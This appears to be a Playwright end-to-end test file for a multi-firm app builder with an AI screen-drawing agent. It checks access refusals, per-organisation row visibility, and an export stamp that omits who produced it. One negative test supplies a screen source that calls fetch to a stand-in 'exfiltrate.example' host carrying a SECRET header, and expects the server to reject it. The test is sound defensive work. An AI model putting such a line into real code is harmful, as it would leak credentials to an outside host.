// T-442 — the stepped builder and its agent, end to end on the seeded
// three-organisation world (ADR-0056, and the 2026-09-06 addendum).
//
// *In plain terms: a consultancy builds an app through the seven steps, the
// agent draws its screens, the app is opened to its people, and then the two
// other firms on the scheme open it and see exactly what they should.*
//
// **Every negative is driven AS THE OTHER PARTY over HTTP**, never inferred
// from a predicate: Owen Vance, whose own firm has not let him build, is
// refused the builder; Nadia at Redgate is not offered the client's dashboard
// at all; and a screen showing every column of every row still hands her
// nothing but her own firm's.
import { expect, test } from '@playwright/test';
import type {
  AppRecord,
  AppRowResponse,
  AppTableRecord,
  GetAppResponse,
  ListAppExportsResponse,
  ListAppRowsResponse,
  ListRosterResponse,
  MeResponse,
  WriteAppScreenResponse,
} from '@infora/contracts';
import { EMPTY_APP_DEFINITION, parseAppScreen } from '@infora/contracts';
import { ApiSession, SEEDED, addStandInScreen } from './support/api';

const stamp = Date.now();

test('the seven steps, the agent’s two questions, and the screens its people open', async () => {
  const rachel = await ApiSession.login(SEEDED.owner); // Trentmoor Energy — the client
  const eleanor = await ApiSession.login(SEEDED.consultant); // Calder & Hale — builds it
  const nadia = await ApiSession.login(SEEDED.secondConsultant); // Redgate Ecology — the peer

  const me = await eleanor.get<MeResponse>('/me');
  const projectId = me.participants.find(
    (p) => p.projectName === 'Wrenfield–Ashcombe 400kV Connection',
  )!.projectId;
  const roster = (await rachel.get<ListRosterResponse>(`/projects/${projectId}/participants`)).items;
  const trentmoorOrgId = roster.find((r) => r.name === 'Rachel Bowen')!.organisationId;
  const redgateOrgId = roster.find((r) => r.name === 'Nadia Okonjo')!.organisationId;

  // ── Step 1 — what the app is, and who it is open to ─────────────────────
  const app = await eleanor.post<AppRecord>(`/projects/${projectId}/apps`, {
    name: `Sustainability returns, built ${stamp}`,
    description: 'Monthly environmental returns from each organisation on the scheme.',
    organisationIds: [trentmoorOrgId, redgateOrgId],
    participantIds: [],
  });
  expect(app.state).toBe('unpublished');
  expect(app.definition).toEqual(EMPTY_APP_DEFINITION);

  // ── The builder is the building firm's, and its own firm decides who ────
  //
  // Owen Vance is a Calder & Hale participant the seed deliberately does NOT
  // give the right to build — a real negative inside the building firm.
  const owen = await ApiSession.login('owen.vance@calderhale.example');
  expect((await owen.raw('get', `/apps/${app.id}`)).status()).toBe(404);
  expect(
    (
      await owen.raw('post', `/apps/${app.id}/builder/conversation`, { say: 'what is this?' })
    ).status(),
  ).toBe(404);

  // ── Step 2 — the tables, and the agent's FIRST required question ────────
  const table = await eleanor.post<AppTableRecord>(`/apps/${app.id}/tables`, {
    name: 'Monthly returns',
    columns: [
      { key: 'month', label: 'Month', type: 'text', required: true },
      { key: 'landfill', label: 'Waste to landfill (tonnes)', type: 'number', required: true },
    ],
    kind: 'data',
    hasAcceptance: true,
  });
  expect(table.hasAcceptance).toBe(true);
  // it is answerable while the table is empty, and by its builders alone
  expect((await rachel.raw('patch', `/app-tables/${table.id}`, { hasAcceptance: false })).status()).toBe(404);
  const corrected = await eleanor.patch<AppTableRecord>(`/app-tables/${table.id}`, {
    hasAcceptance: false,
  });
  expect(corrected.hasAcceptance).toBe(false);
  await eleanor.patch<AppTableRecord>(`/app-tables/${table.id}`, { hasAcceptance: true });

  // ── Step 3 — a connection is DESCRIBED and cannot be connected ──────────
  let definition = {
    ...EMPTY_APP_DEFINITION,
    connections: [
      { id: 'connection-arcgis', system: 'ArcGIS', needs: 'The scheme’s consented boundary layer.' },
    ],
    answeredQuestions: [`contractual-data:${table.id}`],
  };
  await eleanor.patch<AppRecord>(`/apps/${app.id}/definition`, { definition });

  // ── Step 4 — the agent writes each screen, and who may open it narrows ──
  const contractorScreen = await eleanor.post<WriteAppScreenResponse>(
    `/apps/${app.id}/builder/screen`,
    { appTableId: table.id, purpose: 'A form for one month’s return, and the ones already sent.', current: null },
  );
  expect(contractorScreen.followUp).toBeNull();
  expect(contractorScreen.source).not.toBeNull();
  // what came back is a screen in the grammar and nothing else
  const drawn = parseAppScreen(contractorScreen.source, ['month', 'landfill'])!;
  expect(drawn.blocks.map((b) => b.kind)).toContain('rowForm');

  const clientScreen = await eleanor.post<WriteAppScreenResponse>(`/apps/${app.id}/builder/screen`, {
    appTableId: table.id,
    purpose: 'A dashboard of every organisation’s returns.',
    current: null,
  });
  expect(clientScreen.source).not.toBeNull();

  definition = {
    ...definition,
    interfaces: [
      {
        id: 'submit-a-return',
        label: 'Submit a return',
        appTableId: table.id,
        openToOrganisationIds: [],
        source: contractorScreen.source,
      },
      {
        id: 'returns-dashboard',
        label: 'Returns dashboard',
        appTableId: table.id,
        // the client's firm and nobody else — the agent's SECOND required
        // question, answered
        openToOrganisationIds: [trentmoorOrgId],
        source: clientScreen.source,
      },
    ],
    answeredQuestions: [
      `contractual-data:${table.id}`,
      'who-may-open:submit-a-return',
      'who-may-open:returns-dashboard',
    ],
    // ── Step 5 — a schedule, stored and not yet honoured ──────────────────
    schedule: 'monthly',
    // ── Step 6 — the analysis prompt ─────────────────────────────────────
    analysisPrompt: 'Say which organisations have returned this month and which have not.',
  } as typeof definition;
  await eleanor.patch<AppRecord>(`/apps/${app.id}/definition`, { definition });

  // a screen that is not a screen is refused at the boundary — nothing that
  // could name a URL or a credential reaches the store
  const hostile = await eleanor.raw('patch', `/apps/${app.id}/definition`, {
    definition: {
      ...definition,
      interfaces: [
        {
          id: 'sneaky',
          label: 'Dashboard',
          appTableId: table.id,
          openToOrganisationIds: [],
          source: 'await fetch("https://exfiltrate.example", { headers: { key: SECRET } })',
        },
      ],
    },
  });
  expect(hostile.status()).toBe(400);

  // ── Until step 7, none of it exists for anybody else (ruling 2) ─────────
  expect((await rachel.raw('get', `/apps/${app.id}`)).status()).toBe(404);
  expect((await nadia.raw('get', `/apps/${app.id}`)).status()).toBe(404);

  // ── Step 7 — check and open ─────────────────────────────────────────────
  const opened = await eleanor.post<AppRecord>(`/apps/${app.id}/publish`, {});
  expect(opened.state).toBe('open');
  expect(opened.publishedByName).toBe('Eleanor Price');
  expect(opened.published?.schedule).toBe('monthly');
  expect(opened.published?.connections).toHaveLength(1);

  // ── The screens each firm is OFFERED are assembled server-side ──────────
  const screensFor = async (session: ApiSession) => {
    const body = await session.get<GetAppResponse>(`/apps/${app.id}`);
    return (body.app.published?.interfaces ?? []).map((i) => i.label);
  };
  expect(await screensFor(rachel)).toEqual(['Submit a return', 'Returns dashboard']);
  // the peer firm is not offered the client's dashboard AT ALL — absent, never
  // present-and-disabled
  expect(await screensFor(nadia)).toEqual(['Submit a return']);
  // and the narrowing binds the BUILDER's own firm too: Calder & Hale wrote the
  // client's dashboard and is not offered it, because the published copy is
  // what the app's people open and the builder is one of them. The working copy
  // still carries both — that is what the builder edits.
  expect(await screensFor(eleanor)).toEqual(['Submit a return']);
  const working = await eleanor.get<GetAppResponse>(`/apps/${app.id}`);
  expect((working.app.definition?.interfaces ?? []).map((i) => i.label)).toEqual([
    'Submit a return',
    'Returns dashboard',
  ]);

  // ── A published screen shows each viewer only their own rows ────────────
  //
  // The dashboard's table block asks for every column and every organisation.
  // It still hands each viewer only what the read predicate allowed, because a
  // screen names columns and never rows.
  await eleanor.post<AppRowResponse>(`/app-tables/${table.id}/rows`, {
    values: { month: `August ${stamp}`, landfill: 12.4 },
    submit: true,
  });
  await nadia.post<AppRowResponse>(`/app-tables/${table.id}/rows`, {
    values: { month: `August ${stamp}`, landfill: 3.1 },
    submit: true,
  });

  const behindTheScreen = async (session: ApiSession) =>
    (await session.get<ListAppRowsResponse>(`/app-tables/${table.id}/rows`)).items;
  const asContractor = await behindTheScreen(eleanor);
  expect(asContractor).toHaveLength(1);
  expect(asContractor[0]!.organisationName).toBe('Calder & Hale');
  const asPeer = await behindTheScreen(nadia);
  expect(asPeer).toHaveLength(1);
  expect(asPeer[0]!.organisationName).toBe('Redgate Ecology');
  // the client, whose dashboard it is, reads both
  const asClient = await behindTheScreen(rachel);
  expect(asClient.map((r) => r.organisationName).sort()).toEqual(['Calder & Hale', 'Redgate Ecology']);

  await Promise.all([rachel.dispose(), eleanor.dispose(), nadia.dispose(), owen.dispose()]);
});

// T-444 — the export, on the seeded world, taken by two parties over the same
// app (ADR-0056 §8).
//
// **The ticket's done-when, driven as both parties**: a contractor's file holds
// its organisation's rows, the project owner's holds all of them, and the
// stamp shows data and time only. The workbook is read back rather than
// trusted — what is on it, and what is not.
test('an export by a contractor and an export by the client, over one app', async () => {
  const rachel = await ApiSession.login(SEEDED.owner); // Trentmoor Energy — the client
  const eleanor = await ApiSession.login(SEEDED.consultant); // Calder & Hale
  const nadia = await ApiSession.login(SEEDED.secondConsultant); // Redgate Ecology

  const me = await eleanor.get<MeResponse>('/me');
  const projectId = me.participants.find(
    (p) => p.projectName === 'Wrenfield–Ashcombe 400kV Connection',
  )!.projectId;
  const roster = (await rachel.get<ListRosterResponse>(`/projects/${projectId}/participants`)).items;
  const trentmoorOrgId = roster.find((r) => r.name === 'Rachel Bowen')!.organisationId;
  const redgateOrgId = roster.find((r) => r.name === 'Nadia Okonjo')!.organisationId;

  const app = await eleanor.post<AppRecord>(`/projects/${projectId}/apps`, {
    name: `Returns for export ${stamp}`,
    organisationIds: [trentmoorOrgId, redgateOrgId],
    participantIds: [],
  });
  const table = await eleanor.post<AppTableRecord>(`/apps/${app.id}/tables`, {
    name: 'Monthly returns',
    columns: [
      { key: 'month', label: 'Month', type: 'text', required: true },
      { key: 'landfill', label: 'Waste to landfill (tonnes)', type: 'number', required: true },
    ],
    kind: 'data',
    hasAcceptance: true,
  });
  await addStandInScreen(eleanor, app.id); // T-487 — the gate wants a screen to open
  await eleanor.post(`/apps/${app.id}/publish`, {});
  await eleanor.post<AppRowResponse>(`/app-tables/${table.id}/rows`, {
    values: { month: `October ${stamp}`, landfill: 41.5 },
    submit: true,
  });
  await nadia.post<AppRowResponse>(`/app-tables/${table.id}/rows`, {
    values: { month: `October ${stamp}`, landfill: 7.25 },
    submit: true,
  });

  /** The workbook as text — enough to assert which figures are in it and which
   * are not, without a spreadsheet library in the e2e. Inline strings are what
   * `buildXlsx` writes and zip entries are stored uncompressed, so the values
   * are readable in the bytes. */
  const workbook = async (session: ApiSession) => {
    const res = await session.raw('post', `/apps/${app.id}/exports`, {
      format: 'xlsx',
      appTableIds: [],
    });
    expect(res.status()).toBe(200);
    expect(res.headers()['content-disposition']).toContain('.xlsx');
    return (await res.body()).toString('latin1');
  };

  const contractors = await workbook(eleanor);
  expect(contractors).toContain('41.5');
  expect(contractors).toContain('Calder &amp; Hale');
  // the other consultancy's return is not in it, and neither is its name
  // as a CELL value (>…<), not a bare substring: the export's own timestamp
  // once contained ":27.250Z" and failed this line (review 2026-10-18)
  expect(contractors).not.toContain('>7.25<');
  expect(contractors).not.toContain('Redgate Ecology');

  const clients = await workbook(rachel);
  expect(clients).toContain('41.5');
  expect(clients).toContain('>7.25<');
  expect(clients).toContain('Redgate Ecology');

  // 🔒 the stamp: what data, and when. Never who produced it.
  expect(clients).toContain('Produced from');
  expect(clients).toContain('Data as of');
  for (const forbidden of ['Rachel Bowen', 'Eleanor Price', 'Produced by', 'agent', 'drafted']) {
    expect(clients).not.toContain(forbidden);
  }

  // and it is recorded: who took it, over how much, as of when
  const taken = await rachel.get<ListAppExportsResponse>(`/apps/${app.id}/exports`);
  expect(taken.items.map((i) => i.exportedByName).sort()).toEqual(['Eleanor Price', 'Rachel Bowen']);
  expect(taken.items.find((i) => i.exportedByName === 'Rachel Bowen')!.rowsCovered).toBe(2);
  expect(taken.items.find((i) => i.exportedByName === 'Eleanor Price')!.rowsCovered).toBe(1);
  // a firm reads its own and not a rival's
  const asContractor = await eleanor.get<ListAppExportsResponse>(`/apps/${app.id}/exports`);
  expect(asContractor.items.map((i) => i.exportedByName)).toEqual(['Eleanor Price']);

  await Promise.all([rachel.dispose(), eleanor.dispose(), nadia.dispose()]);
});
